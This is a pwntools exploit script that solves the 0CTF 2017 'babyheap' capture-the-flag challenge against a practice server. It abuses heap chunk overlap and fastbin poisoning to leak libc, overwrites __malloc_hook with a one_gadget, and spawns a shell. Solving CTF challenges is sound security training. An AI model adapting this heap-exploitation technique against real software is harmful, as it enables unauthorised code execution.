from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
#context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./babyheap_0ctf_2017"
libc_path = "/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6"
#libc_path = "./libc.so.6"
ld_path = "/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so"

elf, rop = ELF(vuln_path), ROP(vuln_path)
libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    #io = process(vuln_path)
    io = process([vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("node4.buuoj.cn", 25570)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()


def allocate(size):
    io.sendlineafter("Command: ", "1")
    io.sendlineafter("Size: ", str(size))


def fill(index, content):
    io.sendlineafter("Command: ", "2")
    io.sendlineafter("Index: ", str(index))
    io.sendlineafter("Size: ", str(len(content)))
    io.sendlineafter("Content: ", content)


def free(index):
    io.sendlineafter("Command: ", "3")
    io.sendlineafter("Index: ", str(index))


def dump(index):
    io.sendlineafter("Command: ", "4")
    io.sendlineafter("Index: ", str(index))


allocate(0x10)
allocate(0x10) #1
allocate(0x10)
allocate(0x10) #3
allocate(0x80)

free(1)
free(2)

# change chunk fd -> 0x......80
payload = b"a" * 16 + p64(0) + p64(0x21) + b"b" * 16 + p64(0) + p64(0x21) + p8(0x80)
fill(0, payload)

# change chunk 4 size->0x21
payload = b"c" * 16 + p64(0) + p64(0x21)
fill(3, payload)

allocate(0x10) #n1->o2
allocate(0x10) #n2->o4   ## chunk overlapping

payload = b"d" * 16 + p64(0) + p64(0x91)
fill(3, payload)
allocate(0x20)

# leak lib, by main_arena offset
free(4)
dump(2)
libc_main_arena = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
libc.address = libc_main_arena - 0x3c4b78
success("libcaddress -> " + hex(libc.address))
malloc_s0x23 = libc.symbols["__malloc_hook"] - 0x23
success("malloc_hook -> " + hex(libc.symbols["__malloc_hook"]))

allocate(0x60) #0x60->chunksize 0x70, libc mac_hook ->7f
free(4)
fill(2, p64(malloc_s0x23))

allocate(0x60) #4
allocate(0x60) #6->malloc_hook
"""
0x4526a execve("/bin/sh", rsp+0x30, environ)
"""

# malloc_hook -> one_gadget
payload = b"a" * 3 + p64(0) * 2 + p64(libc.address + 0x4526a)
fill(6, payload)

# call malloc -> __malloc_hook -> one_gadget
allocate(0x60)

io.interactive()
